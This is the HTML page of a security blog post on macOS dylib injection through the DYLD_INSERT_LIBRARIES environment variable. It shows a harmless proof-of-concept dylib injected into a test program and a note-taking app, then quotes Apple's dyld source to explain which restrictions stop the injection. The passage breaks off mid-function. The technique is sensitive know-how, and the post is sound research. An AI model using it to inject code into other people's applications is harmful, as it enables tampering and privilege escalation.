<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX · theevilbit blog
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Csaba Fitzl">
<meta name="description" content="After my recent blog post, my old mate @_Dark_Knight_ reached out to me and he asked me a question:
“Do you typically callout user apps that allow dyld_insert_libraries?”
And a few similar ones, and I will be honest, I had no idea what is he talking about, if only I understood the question :D Despite the fact that my recent blog posts and talks are about macOS, I deal much more with Windows on a daily basis, probably like 95%, and macOS is still a whole new territory for me.">
<meta name="keywords" content="">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX">
  <meta name="twitter:description" content="After my recent blog post, my old mate @_Dark_Knight_ reached out to me and he asked me a question:
“Do you typically callout user apps that allow dyld_insert_libraries?”
And a few similar ones, and I will be honest, I had no idea what is he talking about, if only I understood the question :D Despite the fact that my recent blog posts and talks are about macOS, I deal much more with Windows on a daily basis, probably like 95%, and macOS is still a whole new territory for me.">

<meta property="og:url" content="https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/">
  <meta property="og:site_name" content="theevilbit blog">
  <meta property="og:title" content="DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX">
  <meta property="og:description" content="After my recent blog post, my old mate @_Dark_Knight_ reached out to me and he asked me a question:
“Do you typically callout user apps that allow dyld_insert_libraries?”
And a few similar ones, and I will be honest, I had no idea what is he talking about, if only I understood the question :D Despite the fact that my recent blog posts and talks are about macOS, I deal much more with Windows on a daily basis, probably like 95%, and macOS is still a whole new territory for me.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2019-07-09T00:00:00+00:00">
    <meta property="article:modified_time" content="2019-07-09T00:00:00+00:00">
    <meta property="article:tag" content="Macos">
    <meta property="article:tag" content="Injection">
    <meta property="article:tag" content="Lpe">




<link rel="canonical" href="https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/">


<link rel="preload" href="https://theevilbit.github.io/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="https://theevilbit.github.io/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.38c4552ac40f9ae3408bad40358f654ebd8804412fe74ed56f2d6c8a7af82dd3.css" integrity="sha256-OMRVKsQPmuNAi61ANY9lTr2IBEEv507Vby1sinr4LdM=" crossorigin="anonymous" media="screen" />








 




<link rel="icon" type="image/svg+xml" href="https://theevilbit.github.io/images/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="https://theevilbit.github.io/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://theevilbit.github.io/images/apple-touch-icon.png">

<link rel="manifest" href="https://theevilbit.github.io/site.webmanifest">
<link rel="mask-icon" href="https://theevilbit.github.io/images/safari-pinned-tab.svg" color="#5bbad5">









</head>




<body class="preload-transitions colorscheme-light">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://theevilbit.github.io/">
      theevilbit blog
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/posts/">Posts</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/talks/">Talks and Workshops</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/shield/">Shield.app</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/tags/">Tags</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="https://theevilbit.github.io/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/">
              DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2019-07-09T00:00:00Z">
                July 9, 2019
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              17-minute read
            </span>
          </div>
          
          <div class="categories">
  <i class="fa-solid fa-folder" aria-hidden="true"></i>
    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>

          <div class="tags">
  <i class="fa-solid fa-tag" aria-hidden="true"></i>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/macos/">Macos</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/injection/">Injection</a>
    </span>
      <span class="separator">•</span>
    <span class="tag">
      <a href="https://theevilbit.github.io/tags/lpe/">Lpe</a>
    </span></div>

        </div>
      </header>

      <div class="post-content">
        
        <p>After my recent blog post, my old mate <a href="https://twitter.com/_Dark_Knight_"  class="external-link" target="_blank" rel="noopener">@_Dark_Knight_</a> reached out to me and he asked me a question:</p>
<blockquote>
<p>“Do you typically callout user apps that allow dyld_insert_libraries?”</p>
</blockquote>
<p>And a few similar ones, and I will be honest, I had no idea what is he talking about, if only I understood the question :D Despite the fact that my recent blog posts and talks are about macOS, I deal much more with Windows on a daily basis, probably like 95%, and macOS is still a whole new territory for me. So I decided to dig into the question and learn a bit more about this.</p>
<p>As it turns out there is a very well known injection technique for macOS utilizing <code>DYLD_INSERT_LIBRARIES</code> environment variable. Here is the description of the variable from the <a href="https://web.archive.org/web/20160409091449/https://developer.apple.com/library/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html"  class="external-link" target="_blank" rel="noopener">dyld man document</a>:</p>
<pre tabindex="0"><code>DYLD_INSERT_LIBRARIES
              This  is  a colon separated list of dynamic libraries to load before the ones specified in the
              program.  This lets you test new modules of existing dynamic shared libraries that are used in
              flat-namespace images by loading a temporary dynamic shared library with just the new modules.
              Note that this has no effect on images built a two-level  namespace  images  using  a  dynamic
              shared library unless DYLD_FORCE_FLAT_NAMESPACE is also used.
</code></pre><p>In short, it will load any dylibs  you specify in this variable before the program loads, essentially injecting a dylib into the application. Let’s try it! I took my previous dylib code I used when playing with dylib hijacking:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;syslog.h&gt;</span><span style="color:#099">
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
</span></span><span style="display:flex;"><span><span style="color:#c0f">__attribute__</span>((constructor))
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">customConstructor</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
</span></span><span style="display:flex;"><span> {
</span></span><span style="display:flex;"><span>     <span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;Hello from dylib!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
</span></span><span style="display:flex;"><span>     <span style="color:#c0f">syslog</span>(LOG_ERR, <span style="color:#c30">&#34;Dylib injection successful in %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, argv[<span style="color:#f60">0</span>]);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compile:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib inject.c -o inject.dylib
</span></span></code></pre></div><p>For a quick test I made a sophisticated hello world C code, and tried it with that. In order to set the environment variable for the application to be executed, you need to specify <code>DYLD_INSERT_LIBRARIES=[path to your dylib]</code> in the command line. Here is how it looks like:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./test 
</span></span><span style="display:flex;"><span>Hello world
</span></span><span style="display:flex;"><span>$ <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib ./test
</span></span><span style="display:flex;"><span>Hello from dylib!
</span></span><span style="display:flex;"><span>Hello world
</span></span></code></pre></div><p>Executing my favourite note taker application, Bear (where I’m writing this right now) is also affected:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib /Applications/Bear.app/Contents/MacOS/Bear 
</span></span><span style="display:flex;"><span>Hello from dylib!
</span></span></code></pre></div><p>We can also see all these events in the log (as our dylib puts there a message):</p>
<p><img src="https://theevilbit.github.io/images/DYLD_INSERT_LIBRARIES_DYLIB_injection_in_macOS_OSX_deep_dive/Screenshot%202019-07-08%20at%2016.53.29.png" alt="image"></p>
<p>There are two nice examples in the following blog posts about how to hook the application itself:</p>
<p><a href="http://thomasfinch.me/blog/2015/07/24/Hooking-C-Functions-At-Runtime.html"  class="external-link" target="_blank" rel="noopener">Thomas Finch - Hooking C Functions at Runtime</a></p>
<p><a href="https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/"  class="external-link" target="_blank" rel="noopener">Simple code injection using DYLD_INSERT_LIBRARIES</a></p>
<p>I will not repeat those, so if you are interested please read those.</p>
<p>Can you prevent this infection? Michael mentioned that you can do it by adding a RESTRICTED segment at compile time, so I decided to research it more. According to <a href="https://web.archive.org/web/20161007013145/http://pewpewthespells.com/blog/blocking_code_injection_on_ios_and_os_x.html"  class="external-link" target="_blank" rel="noopener">Blocking Code Injection on iOS and OS X</a> there are three cases when this environment variable will be ignored:</p>
<ol>
<li>setuid and/or setgid bits are set</li>
<li>restricted by entitlements</li>
<li>restricted segment</li>
</ol>
<p>We can actually see this in the source code of dyld - this is an older version, but it’s also more readable: <a href="https://opensource.apple.com/source/dyld/dyld-210.2.3/src/dyld.cpp"  class="external-link" target="_blank" rel="noopener">https://opensource.apple.com/source/dyld/dyld-210.2.3/src/dyld.cpp</a></p>
<p>The function <code>pruneEnvironmentVariables</code> will remove the environment variables:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">pruneEnvironmentVariables</span>(<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span> envp[], <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">***</span> applep)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">// delete all DYLD_* and LD_LIBRARY_PATH environment variables
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	<span style="color:#078;font-weight:bold">int</span> removedCount <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">**</span> d <span style="color:#555">=</span> envp;
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span>(<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">**</span> s <span style="color:#555">=</span> envp; <span style="color:#555">*</span>s <span style="color:#555">!=</span> <span style="color:#366">NULL</span>; s<span style="color:#555">++</span>) {
</span></span><span style="display:flex;"><span>	    <span style="color:#069;font-weight:bold">if</span> ( (<span style="color:#c0f">strncmp</span>(<span style="color:#555">*</span>s, <span style="color:#c30">&#34;DYLD_&#34;</span>, <span style="color:#f60">5</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) <span style="color:#555">&amp;&amp;</span> (<span style="color:#c0f">strncmp</span>(<span style="color:#555">*</span>s, <span style="color:#c30">&#34;LD_LIBRARY_PATH=&#34;</span>, <span style="color:#f60">16</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) ) {
</span></span><span style="display:flex;"><span>			<span style="color:#555">*</span>d<span style="color:#555">++</span> <span style="color:#555">=</span> <span style="color:#555">*</span>s;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#555">++</span>removedCount;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#555">*</span>d<span style="color:#555">++</span> <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> ( removedCount <span style="color:#555">!=</span> <span style="color:#f60">0</span> ) {
</span></span><span style="display:flex;"><span>		dyld<span style="color:#555">::</span><span style="color:#c0f">log</span>(<span style="color:#c30">&#34;dyld: DYLD_ environment variables being ignored because &#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">switch</span> (sRestrictedReason) {
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">restrictedNot</span>:
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">restrictedBySetGUid</span>:
</span></span><span style="display:flex;"><span>				dyld<span style="color:#555">::</span><span style="color:#c0f">log</span>(<span style="color:#c30">&#34;main executable (%s) is setuid or setgid</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, sExecPath);
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">restrictedBySegment</span>:
</span></span><span style="display:flex;"><span>				dyld<span style="color:#555">::</span><span style="color:#c0f">log</span>(<span style="color:#c30">&#34;main executable (%s) has __RESTRICT/__restrict section</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, sExecPath);
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">restrictedByEntitlements</span>:
</span></span><span style="display:flex;"><span>				dyld<span style="color:#555">::</span><span style="color:#c0f">log</span>(<span style="color:#c30">&#34;main executable (%s) is code signed with entitlements</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, sExecPath);
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">// slide apple parameters
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	<span style="color:#069;font-weight:bold">if</span> ( removedCount <span style="color:#555">&gt;</span> <span style="color:#f60">0</span> ) {
</span></span><span style="display:flex;"><span>		<span style="color:#555">*</span>applep <span style="color:#555">=</span> d;
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">do</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#555">*</span>d <span style="color:#555">=</span> d[removedCount];
</span></span><span style="display:flex;"><span>		} <span style="color:#069;font-weight:bold">while</span> ( <span style="color:#555">*</span>d<span style="color:#555">++</span> <span style="color:#555">!=</span> <span style="color:#366">NULL</span> );
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">for</span>(<span style="color:#078;font-weight:bold">int</span> i<span style="color:#555">=</span><span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> removedCount; <span style="color:#555">++</span>i)
</span></span><span style="display:flex;"><span>			<span style="color:#555">*</span>d<span style="color:#555">++</span> <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#09f;font-style:italic">// disable framework and library fallback paths for setuid binaries rdar://problem/4589305
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>	sEnv.DYLD_FALLBACK_FRAMEWORK_PATH <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
</span></span><span style="display:flex;"><span>	sEnv.DYLD_FALLBACK_LIBRARY_PATH <span style="color:#555">=</span> <span style="color:#366">NULL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we search where the variable <code>sRestrictedReason</code> is set, we arrive to the function <code>processRestricted</code>:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">bool</span> <span style="color:#c0f">processRestricted</span>(<span style="color:#069;font-weight:bold">const</span> macho_header<span style="color:#555">*</span> mainExecutableMH)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic">// all processes with setuid or setgid bit set are restricted
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">issetugid</span>() ) {
</span></span><span style="display:flex;"><span>		sRestrictedReason <span style="color:#555">=</span> restrictedBySetGUid;
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">true</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">uid_t</span> euid <span style="color:#555">=</span> <span style="color:#c0f">geteuid</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">if</span> ( (euid <span style="color:#555">!=</span> <span style="color:#f60">0</span>) <span style="color:#555">&amp;&amp;</span> <span style="color:#c0f">hasRestrictedSegment</span>(mainExecutableMH) ) {
</span></span><span style="display:flex;"><span>		<span style="color:#09f;font-style:italic">// existence of __RESTRICT/__restrict section make process restricted
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>		sRestrictedReason <span style="color:#555">=</span> restrictedBySegment;
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">true</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span><span style="color:#099">#if __MAC_OS_X_VERSION_MIN_REQUIRED    
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>    <span style="color:#09f;font-style:italic">// ask kernel if code signature of program makes it restricted
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>    <span style="color:#078;font-weight:bold">uint32_t</span> flags;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">syscall</span>(SYS_csops <span style="color:#09f;font-style:italic">/* 169 */</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#f60">0</span> <span style="color:#09f;font-style:italic">/* asking about myself */</span>,
</span></span><span style="display:flex;"><span>                CS_OPS_STATUS,
</span></span><span style="display:flex;"><span>                <span style="color:#555">&amp;</span>flags,
</span></span><span style="display:flex;"><span>                <span style="color:#069;font-weight:bold">sizeof</span>(flags)) <span style="color:#555">!=</span> <span style="color:#555">-</span><span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (flags <span style="color:#555">&amp;</span> CS_RESTRICT) {
</span></span><span style="display:flex;"><span>			sRestrictedReason <span style="color:#555">=</span> restrictedByEntitlements;
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">true</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#099">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#366">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is the code segment that will identify the restricted segment:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Look for a special segment in the mach header. 
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Its presences means that the binary wants to have DYLD ignore
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// DYLD_ environment variables.
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#099">#if __MAC_OS_X_VERSION_MIN_REQUIRED
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">bool</span> <span style="color:#c0f">hasRestrictedSegment</span>(<span style="color:#069;font-weight:bold">const</span> macho_header<span style="color:#555">*</span> mh)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">uint32_t</span> cmd_count <span style="color:#555">=</span> mh<span style="color:#555">-&gt;</span>ncmds;
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> load_command<span style="color:#555">*</span> <span style="color:#069;font-weight:bold">const</span> cmds <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">struct</span> load_command<span style="color:#555">*</span>)(((<span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span>)mh)<span style="color:#555">+</span><span style="color:#069;font-weight:bold">sizeof</span>(macho_header));
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> load_command<span style="color:#555">*</span> cmd <span style="color:#555">=</span> cmds;
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span> (<span style="color:#078;font-weight:bold">uint32_t</span> i <span style="color:#555">=</span> <span style="color:#f60">0</span>; i <span style="color:#555">&lt;</span> cmd_count; <span style="color:#555">++</span>i) {
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">switch</span> (cmd<span style="color:#555">-&gt;</span>cmd) {
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">case</span> <span style="color:#99f">LC_SEGMENT_COMMAND</span>:
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> macho_segment_command<span style="color:#555">*</span> seg <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">struct</span> macho_segment_command<span style="color:#555">*</span>)cmd;
</span></span><span style="display:flex;"><span>				
</span></span><span style="display:flex;"><span>				<span style="color:#09f;font-style:italic">//dyld::log(&#34;seg name: %s\n&#34;, seg-&gt;segname);
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>				<span style="color:#069;font-weight:bold">if</span> (<span style="color:#c0f">strcmp</span>(seg<span style="color:#555">-&gt;</span>segname, <span style="color:#c30">&#34;__RESTRICT&#34;</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>					<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> macho_section<span style="color:#555">*</span> <span style="color:#069;font-weight:bold">const</span> sectionsStart <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">struct</span> macho_section<span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span>)seg <span style="color:#555">+</span> <span style="color:#069;font-weight:bold">sizeof</span>(<span style="color:#069;font-weight:bold">struct</span> macho_segment_command));
</span></span><span style="display:flex;"><span>					<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> macho_section<span style="color:#555">*</span> <span style="color:#069;font-weight:bold">const</span> sectionsEnd <span style="color:#555">=</span> <span style="color:#555">&amp;</span>sectionsStart[seg<span style="color:#555">-&gt;</span>nsects];
</span></span><span style="display:flex;"><span>					<span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> macho_section<span style="color:#555">*</span> sect<span style="color:#555">=</span>sectionsStart; sect <span style="color:#555">&lt;</span> sectionsEnd; <span style="color:#555">++</span>sect) {
</span></span><span style="display:flex;"><span>						<span style="color:#069;font-weight:bold">if</span> (<span style="color:#c0f">strcmp</span>(sect<span style="color:#555">-&gt;</span>sectname, <span style="color:#c30">&#34;__restrict&#34;</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) 
</span></span><span style="display:flex;"><span>							<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">true</span>;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		cmd <span style="color:#555">=</span> (<span style="color:#069;font-weight:bold">const</span> <span style="color:#069;font-weight:bold">struct</span> load_command<span style="color:#555">*</span>)(((<span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span>)cmd)<span style="color:#555">+</span>cmd<span style="color:#555">-&gt;</span>cmdsize);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">return</span> <span style="color:#366">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#099">#endif
</span></span></span></code></pre></div><p>Now, the above is the old source code, that was referred in the article above - since then it has evolved. The latest available code is <a href="https://opensource.apple.com/source/dyld/dyld-635.2/src/dyld.cpp.auto.html"  class="external-link" target="_blank" rel="noopener">dyld.cpp</a> looks slightly more complicated,  but essentially the same idea.  Here is the relevant code segment, that sets the restriction, and the one that returns it (<code>configureProcessRestrictions , processIsRestricted </code>):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">configureProcessRestrictions</span>(<span style="color:#069;font-weight:bold">const</span> macho_header<span style="color:#555">*</span> mainExecutableMH)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#078;font-weight:bold">uint64_t</span> amfiInputFlags <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span><span style="color:#099">#if TARGET_IPHONE_SIMULATOR
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	amfiInputFlags <span style="color:#555">|=</span> AMFI_DYLD_INPUT_PROC_IN_SIMULATOR;
</span></span><span style="display:flex;"><span><span style="color:#099">#elif __MAC_OS_X_VERSION_MIN_REQUIRED
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">hasRestrictedSegment</span>(mainExecutableMH) )
</span></span><span style="display:flex;"><span>		amfiInputFlags <span style="color:#555">|=</span> AMFI_DYLD_INPUT_PROC_HAS_RESTRICT_SEG;
</span></span><span style="display:flex;"><span><span style="color:#099">#elif __IPHONE_OS_VERSION_MIN_REQUIRED
</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>	<span style="color:#069;font-weight:bold">if</span> ( <span style="color:#c0f">isFairPlayEncrypted</span>(mainExecutableMH) )
